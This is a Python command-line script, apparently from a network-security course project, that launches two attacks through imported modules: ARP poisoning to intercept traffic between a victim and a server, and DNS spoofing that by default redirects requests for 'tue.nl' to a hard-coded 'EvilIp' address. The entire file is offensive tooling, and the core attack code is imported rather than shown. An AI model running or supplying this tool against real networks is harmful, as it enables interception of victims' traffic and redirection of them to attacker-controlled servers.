import typer
from scapy.all import conf

import ArpPoison;

#from DNS_Spoofer import DnsSnoof
from queued_dns_spoof import Dns_spoof

app = typer.Typer()

@app.command()
def Arp_MiM(ipVictim: str, ipServer: str):
    ArpPoison.MIMspoofARP(ipVictim=ipVictim, ipServer=ipServer)

@app.command()
def DNS_Spoof(ipVictim: str = "0.0.0.0", OGSite: str = 'tue.nl', EvilIp: str = "146.190.62.39", queue_num: int = 1, ipRouter = "Default Router"):
    
    if ipRouter == "Default Router":
        ipRouter = conf.route.route("0.0.0.0")[2]

    #print (f'ipVictim = {ipVictim}, ipRouter = {ipRouter}, evilIP = {EvilIp}, OGSite = {OGSite}, queue_num = {queue_num}')

    host = (OGSite, EvilIp)
    print(host)
    spoof = Dns_spoof(queue_num=queue_num, ipVictim=ipVictim, ipServer=ipRouter, host=host)
    spoof()

if __name__ == "__main__":
    app()